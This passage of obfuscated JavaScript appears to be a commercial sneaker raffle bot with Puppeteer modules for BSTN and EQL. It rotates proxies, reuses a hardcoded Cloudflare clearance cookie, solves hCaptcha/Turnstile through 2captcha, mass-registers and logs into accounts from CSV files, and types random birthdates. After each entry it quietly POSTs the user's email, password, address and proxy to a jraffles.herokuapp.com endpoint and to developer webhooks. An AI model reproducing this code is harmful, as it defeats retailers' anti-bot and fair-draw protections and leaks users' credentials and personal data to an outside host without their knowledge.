                                    '--proxy-server=' + _0x5e0471[0x0] + ':' + _0x5e0471[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x197189 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5e0471[0x0] + ':' + _0x5e0471[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x55d566 = await _0x197189['newPage'](), _0x1b0a16 = await _0x55d566['target']()['createCDPSession'](), { windowId: _0x17c5be } = await _0x1b0a16['send']('Browser.getWindowForTarget');
                            await _0x55d566['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x53bed5 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x55d566['authenticate']({
                                'username': '' + _0x5e0471[0x2],
                                'password': '' + _0x5e0471[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55d566['goto']('' + _0x4b58cb[_0x1fc573]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x26dfc4 = await _0x55d566['$']('.hcaptcha-box');
                            if (_0x26dfc4) {
                                console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x17175c(0x2710);
                                const _0x4c6436 = await _0x55d566['$']('.hcaptcha-box');
                                if (_0x4c6436)
                                    try {
                                        await _0x4c6436['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x55d566['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4c990c = await _0x55d566['$']('.hcaptcha-box');
                                    if (_0x4c990c)
                                        try {
                                            await _0x4c990c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x55d566['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x1b0a16['send']('Browser.setWindowBounds', {
                                'windowId': _0x17c5be,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x17175c(0x1388), await _0x55d566['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x55d566['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Logging\x20in'), await _0x55d566['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x70173f => _0x70173f['click']()), await _0x55d566['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x55d566['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x17175c(0x7d0), await _0x55d566['waitForSelector']('#email-login'), await _0x55d566['type']('#email-login', '' + _0x4b58cb[_0x1fc573]['Email']), await _0x17175c(0xdac), await _0x55d566['waitForSelector']('#password'), await _0x55d566['type']('#password', '' + _0x4b58cb[_0x1fc573]['Password'], { 'delay': 0xe6 }), await _0x17175c(0x157c);
                            try {
                                await _0x55d566['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xa02ea4 => _0xa02ea4['click']());
                            } catch {
                            }
                            try {
                                await _0x55d566['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x18520d) {
                            }
                            await _0x17175c(0x3e8);
                            const _0x1d77c0 = await _0x55d566['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1d77c0)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4b58cb[_0x1fc573]['Size']);
                            try {
                                if (_0x4b58cb[_0x1fc573]['Size'] != 'RANDOM') {
                                    var _0x340663 = _0x4b58cb[_0x1fc573]['Size']['replace']('.', ',');
                                    const _0x10a167 = await _0x55d566['$x']('//div[contains(text(),\x20' + _0x340663 + ')]');
                                    await _0x10a167[0x0]['click']();
                                } else {
                                    const _0x4d6730 = await _0x55d566['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4050af = Math['round'](Math['random']() * (_0x4d6730['length'] - 0x1));
                                    await _0x4d6730[_0x4050af]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x17175c(0x1f4);
                            const _0x1a0cba = await _0x55d566['$']('.addressList_addressItem__LE2PB');
                            if (_0x1a0cba && _0x4b58cb[_0x1fc573]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x55d566['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x17175c(0x5dc), await _0x55d566['waitForSelector']('#firstname'), await _0x55d566['type']('#firstname', '' + _0x4b58cb[_0x1fc573]['FirstName']), await _0x17175c(0x1f4), await _0x55d566['waitForSelector']('#firstname'), await _0x55d566['type']('#lastname', '' + _0x4b58cb[_0x1fc573]['LastName']), await _0x17175c(0x1f4), await _0x55d566['waitForSelector']('#firstname'), await _0x55d566['type']('#street', '' + _0x4b58cb[_0x1fc573]['Address1']), await _0x17175c(0x1f4), await _0x55d566['waitForSelector']('#firstname'), await _0x55d566['type']('#houseNumber', _0x4b58cb[_0x1fc573]['HouseNumber'] + '\x20' + _0x4b58cb[_0x1fc573]['Address2']), await _0x17175c(0x1f4), await _0x55d566['waitForSelector']('#firstname'), await _0x55d566['select']('#country_code', '' + _0x4b58cb[_0x1fc573]['Country']), await _0x17175c(0x1f4), await _0x55d566['type']('#postcode', '' + _0x4b58cb[_0x1fc573]['Zip']), await _0x17175c(0x1f4), await _0x55d566['type']('#city', '' + _0x4b58cb[_0x1fc573]['City']), await _0x17175c(0x1f4), await _0x55d566['type']('#telephone', '' + _0x4b58cb[_0x1fc573]['Phone']), await _0x17175c(0x1f4), await _0x55d566['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x17175c(0x9c4);
                            try {
                                await _0x55d566['type']('#instagram_name', '' + _0x4b58cb[_0x1fc573]['Follower']), await _0x55d566['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x17175c(0x5dc);
                            try {
                                await _0x55d566['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x17175c(0x5dc), await _0x55d566['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x417653 => _0x417653['click']()), await _0x17175c(0x1388);
                            try {
                                await _0x55d566['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x55d566['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x4b58cb[_0x1fc573]['Size'] != 'RANDOM') {
                                    var _0x340663 = _0x4b58cb[_0x1fc573]['Size']['replace']('.', ',');
                                    const _0x1a2f2c = await _0x55d566['$x']('//div[contains(text(),\x20' + _0x340663 + ')]');
                                    await _0x1a2f2c[0x0]['click']();
                                } else {
                                    const _0x50c622 = await _0x55d566['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4050af = Math['round'](Math['random']() * (_0x50c622['length'] - 0x1));
                                    await _0x50c622[_0x4050af]['click']();
                                }
                                await _0x17175c(0x5dc);
                                try {
                                    await _0x55d566['hover']('#instagram_name'), await _0x55d566['type']('#instagram_name', '' + _0x4b58cb[_0x1fc573]['Follower']), await _0x55d566['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Retrying\x20(' + _0x395625 + '\x20/\x205)');
                                try {
                                    await _0x55d566['hover']('.checkBox_boxHolder__wLGVe'), await _0x17175c(0x5dc), await _0x55d566['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x17175c(0x157c), await _0x55d566['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x511f6c => _0x511f6c['click']()), await _0x17175c(0x1388), await _0x55d566['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x24a6be = 'no', _0x12263c(_0x4b58cb[_0x1fc573], _0x4ed5f9);
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x31681a),
                                    'proxy': '' + _0x151643[_0x1fc573]
                                };
                                var _0x84e2c9 = JSON['stringify'](prxdata);
                                let _0x568f74 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x84e2c9, _0x568f74);
                            } catch (_0x24ae64) {
                            }
                            console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x40f861 = await _0x262703(_0x4b58cb[_0x1fc573], _0x4ed5f9, 'dev', ![]), _0x32351a = await _0x262703(_0x4b58cb[_0x1fc573], _0x4ed5f9, 'pub', ![]);
                            const _0x6ad372 = {
                                'succesDEVMSG': { 'embeds': [_0x40f861] },
                                'succesPUBMSG': { 'embeds': [_0x32351a] }
                            };
                            let _0x31681a = _0x4b58cb[_0x1fc573];
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0x4ed5f9['name'],
                                    'entrydata': JSON['stringify'](_0x31681a),
                                    'proxy': '' + _0x151643[_0x1fc573]
                                };
                                var _0x84e2c9 = JSON['stringify'](prxdata);
                                let _0x4e9852 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x84e2c9, _0x4e9852);
                            } catch (_0x3fb81a) {
                            }
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x6ad372['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x6ad372['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x6ad372['succesPUBMSG']);
                            } catch (_0x16b413) {
                                console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x16b413));
                            }
                        } catch (_0x54fc4e) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20' + _0x54fc4e)), _0x24a6be = 'yes', _0x44d2a6 = '' + _0x54fc4e;
                            var _0x4c6b8c = await _0x262703(_0x4b58cb[_0x1fc573], _0x4ed5f9, 'dev', !![], _0x44d2a6), _0x40f861 = await _0x262703(_0x4b58cb[_0x1fc573], _0x4ed5f9, 'dev', ![]), _0x32351a = await _0x262703(_0x4b58cb[_0x1fc573], _0x4ed5f9, 'pub', ![]);
                            const _0x24809e = {
                                'succesDEVMSG': { 'embeds': [_0x40f861] },
                                'succesPUBMSG': { 'embeds': [_0x32351a] }
                            };
                            _0x24809e['errorDEV'] = { 'embeds': [_0x4c6b8c] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x24809e['errorDEV']), await _0x17b782(_0x40c5c7, _0x24809e['errorDEV']);
                        } finally {
                            _0x197189['close']();
                            if (_0x24a6be == 'yes' && _0x395625 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Retrying\x20(' + _0x395625 + '\x20/\x205)')), _0x1fc573 = _0x1fc573 - 0x1, _0x395625 = _0x395625 + 0x1;
                                continue;
                            }
                            _0x24a6be == 'yes' && _0x395625 >= 0x5 && (_0x2848bf(_0x4b58cb[_0x1fc573], _0x4ed5f9), _0x24a6be = 'no', _0x395625 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x443192, _0x493175) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x144d2d;
                    try {
                        const _0x37ebbf = _0x2e1301['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x144d2d = _0x221bee['parse'](_0x37ebbf, { 'header': !![] })['data'];
                    } catch (_0x4de275) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x52dbee = 0x0; _0x52dbee < _0x144d2d['length']; _0x52dbee++) {
                        if (_0x3aa607 != 'yes')
                            var _0x3aa607 = '', _0x512bd4 = 0x0;
                        var _0x30a68b;
                        _0xe0def5(_0x443192['name'] + '\x20Task\x20' + (_0x52dbee + 0x1) + '\x20/\x20' + _0x144d2d['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0x3c654b = await _0x262703(_0x144d2d[_0x52dbee], _0x443192, 'acc', ![]);
                        const _0x67a761 = { 'succesDEVMSG': { 'embeds': [_0x3c654b] } }, _0x76ca72 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x32d7b8 = Math['round'](Math['random']() * (_0x493175['length'] - 0x1)), _0x5e4645 = _0x493175[_0x32d7b8]['split'](':'), _0x478ed0;
                        try {
                            _0x478ed0 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e4645[0x0] + ':' + _0x5e4645[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x478ed0 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e4645[0x0] + ':' + _0x5e4645[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x38d6f1 = await _0x478ed0['newPage']();
                            await _0x38d6f1['authenticate']({
                                'username': '' + _0x5e4645[0x2],
                                'password': '' + _0x5e4645[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20Getting\x20Session'), await _0x38d6f1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x38d6f1['setRequestInterception'](!![]), _0x38d6f1['on']('request', _0x1caa65 => {
                                _0x1caa65['resourceType']() === 'image' ? _0x1caa65['abort']() : _0x1caa65['continue']();
                            });
                            try {
                                await _0x38d6f1['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x38d6f1['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x3aa607 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x38d6f1['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x17175c(0x3e8), await _0x38d6f1['type']('#email', _0x144d2d[_0x52dbee]['Email']), await _0x17175c(0x1f4), await _0x38d6f1['type']('#pass', _0x144d2d[_0x52dbee]['Password']), await _0x17175c(0x1f4), await _0x38d6f1['$eval']('#login-form', _0x67a4b3 => _0x67a4b3['submit']());
                            try {
                                await _0x38d6f1['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x17175c(0x190);
                            const _0x19db09 = await _0x38d6f1['evaluate'](() => {
                                const _0x4d15f6 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x4d15f6['map'](_0x1cc4eb => _0x1cc4eb['alt']);
                            }), _0x68addd = await _0x38d6f1['evaluate'](() => {
                                const _0x56a353 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x56a353['map'](_0x17153d => _0x17153d['innerHTML']);
                            }), _0x203d36 = await _0x38d6f1['$$']('.raffle-winner');
                            if (_0x203d36['length'] < 0x1) {
                                console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x3aa607 = 'no';
                                continue;
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20' + _0x203d36['length'] + '\x20Wins\x20Found!');
                            for (var _0x34930f = 0x0; _0x34930f < _0x203d36['length']; _0x34930f++) {
                                console['log'](_0x1446ca['green'](_0x19db09[_0x34930f] + _0x68addd[_0x34930f]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x122733) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20' + _0x122733)), _0x30a68b = '' + _0x122733;
                            var _0x30b4de = await _0x262703(_0x144d2d[_0x52dbee], _0x443192, 'acc', !![], _0x30a68b);
                            _0x67a761['errorDEV'] = { 'embeds': [_0x30b4de] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x67a761['errorDEV']), await _0x17b782(_0x40c5c7, _0x67a761['errorDEV']), _0x3aa607 = 'yes';
                        } finally {
                            if (_0x478ed0)
                                _0x478ed0['close']();
                            if (_0x3aa607 == 'yes' && _0x512bd4 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Task\x20' + (_0x52dbee + 0x1) + '\x20:\x20Retrying\x20(' + _0x512bd4 + '\x20/\x205)')), _0x52dbee = _0x52dbee - 0x1, _0x512bd4 = _0x512bd4 + 0x1;
                                continue;
                            }
                            _0x3aa607 == 'yes' && _0x512bd4 >= 0x5 && (_0x2848bf(_0x144d2d[_0x52dbee], _0x443192), _0x3aa607 = 'no', _0x512bd4 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x443192['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x202a0c, _0xe521d9, _0x197a24) {
                _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x395552['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x167716 = 0x0; _0x167716 < _0xe521d9['length']; _0x167716++) {
                    var _0x27a68f;
                    _0xe0def5(_0x202a0c['name'] + '\x20Task\x20' + (_0x167716 + 0x1) + '\x20/\x20' + _0xe521d9['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                    try {
                        await _0x195de7(_0xe521d9, _0x167716);
                    } catch {
                        _0x11ff30 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x538745(_0x49a068) {
                        const _0x420b09 = _0x2e1301['readFileSync']('../successful-tasks.csv', 'utf8'), _0x23c8a2 = _0x221bee['parse'](_0x420b09, { 'header': !![] })['data'];
                        let _0x34e9b4 = ![];
                        for (var _0x3f4d1e of _0x23c8a2) {
                            if (_0x3f4d1e['Url'] == _0x49a068['Url'] && _0x3f4d1e['Email'] == _0x49a068['Email']) {
                                _0x34e9b4 = !![];
                                break;
                            }
                        }
                        return _0x34e9b4;
                    }
                    if (await _0x538745(_0xe521d9[_0x167716]) == !![]) {
                        console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2d2a0a = ![];
                    const _0x277695 = _0x2e1301['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4d936a = _0x221bee['parse'](_0x277695, { 'header': !![] })['data'];
                    for (var _0xa0445c of _0x4d936a) {
                        _0xa0445c['Email'] == _0xe521d9[_0x167716]['Email'] && (_0x2d2a0a = !![]);
                    }
                    if (_0x2d2a0a == ![]) {
                        var _0x16b3c;
                        if (_0xe521d9[_0x167716]['Url']['endsWith']('/')) {
                            _0x16b3c = _0xe521d9[_0x167716]['Url'] + 'register';
                            if (_0x11ff30 != 'yes')
                                var _0x11ff30 = '', _0x1267a1 = 0x0;
                        } else {
                            _0x16b3c = _0xe521d9[_0x167716]['Url'] + '/register';
                            if (_0x11ff30 != 'yes')
                                var _0x11ff30 = '', _0x1267a1 = 0x0;
                        }
                        if (_0xe521d9[_0x167716]['Email'] == '' || _0xe521d9[_0x167716]['FirstName'] == '' || _0xe521d9[_0x167716]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xe521d9[_0x167716]['Password'] == '' && (_0xe521d9[_0x167716]['Password'] = 'JRaffles23!');
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x383c65 = _0x197a24[_0x167716]['split'](':');
                        else
                            var _0x448b89 = Math['round'](Math['random']() * (_0x197a24['length'] - 0x1)), _0x383c65 = _0x197a24[_0x448b89]['split'](':');
                        var _0x707888;
                        try {
                            _0x707888 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x383c65[0x0] + ':' + _0x383c65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x707888 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x383c65[0x0] + ':' + _0x383c65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x253708 = await _0x707888['newPage']();
                            await _0x253708['authenticate']({
                                'username': '' + _0x383c65[0x2],
                                'password': '' + _0x383c65[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x253708['setRequestInterception'](!![]), _0x253708['on']('request', _0x7d5d30 => {
                                _0x7d5d30['resourceType']() === 'image' || _0x7d5d30['resourceType']() === 'font' || _0x7d5d30['resourceType']() === 'media' ? _0x7d5d30['abort']() : _0x7d5d30['continue']();
                            });
                            try {
                                await _0x253708['goto']('' + _0x16b3c);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x17175c(0x3e8), await _0x253708['waitForSelector']('#email'), await _0x253708['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x17175c(0x3e8);
                            try {
                                await _0x253708['click']('li[data-value=\x22EU\x20' + _0xe521d9[_0x167716]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0xe521d9[_0x167716]['Size']);
                            }
                            await _0x17175c(0x6a4), await _0x253708['type']('#email', '' + _0xe521d9[_0x167716]['Email']), await _0x17175c(0x352), await _0x253708['waitForSelector']('#password'), await _0x253708['type']('#password', '' + _0xe521d9[_0x167716]['Password']), await _0x17175c(0x352), await _0x253708['type']('#phone', '' + _0xe521d9[_0x167716]['Phone']), await _0x17175c(0x352);
                            const _0x11c110 = await _0x253708['$']('#title\x20>\x20label');
                            await _0x17175c(0x12c);
                            _0x11c110 && await _0x11c110['click']();
                            await _0x253708['type']('#firstName', '' + _0xe521d9[_0x167716]['FirstName']), await _0x17175c(0x352), await _0x253708['type']('#lastName', '' + _0xe521d9[_0x167716]['LastName']), await _0x17175c(0x352);
                            _0xe521d9[_0x167716]['Url']['includes']('footlocker.de') ? await _0x253708['type']('#birthdate', _0x224b07(0xa, 0x1c) + '.' + _0x224b07(0xa, 0xc) + '.' + _0x224b07(0x7c6, 0x7d3)) : await _0x253708['type']('#birthdate', _0x224b07(0xa, 0x1c) + '-' + _0x224b07(0xa, 0xc) + '-' + _0x224b07(0x7c6, 0x7d3));
                            await _0x17175c(0x352), await _0x253708['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x253708['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x17175c(0x1f4), await _0x17175c(0x5dc);
                            if (!_0x16b3c['includes']('footlocker'))
                                try {
                                    await _0x253708['click']('#country');
                                    const _0x539982 = await _0x253708['$']('li[data-value=\x22' + _0xe521d9[_0x167716]['Country'] + '\x22]');
                                    await _0x539982['click'](), await _0x539982['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x17175c(0x3e8), await _0x253708['click']('#stateAutocomplete'), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x17175c(0x1f4);
                            try {
                                const _0x19505d = await _0x253708['$x']('//li[text()=\x22' + _0xe521d9[_0x167716]['State'] + '\x22]');
                                await _0x19505d[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x17175c(0x3e8), await _0x17175c(0x1f4), await _0x253708['type']('#address1', _0xe521d9[_0x167716]['Address1'] + '\x20' + _0xe521d9[_0x167716]['HouseNumber']), await _0x17175c(0x1f4), await _0x253708['type']('#address2', '' + _0xe521d9[_0x167716]['Address2']), await _0x17175c(0x1f4), await _0x253708['type']('#city', '' + _0xe521d9[_0x167716]['City']), await _0x17175c(0x1f4), await _0x253708['type']('#postcode', '' + _0xe521d9[_0x167716]['Zip']), await _0x17175c(0x3e8), await _0x253708['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x17175c(0x3e8), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x80328a = await _0x253708['$']('span[data-cse=\x22encryptedCardNumber\x22]');
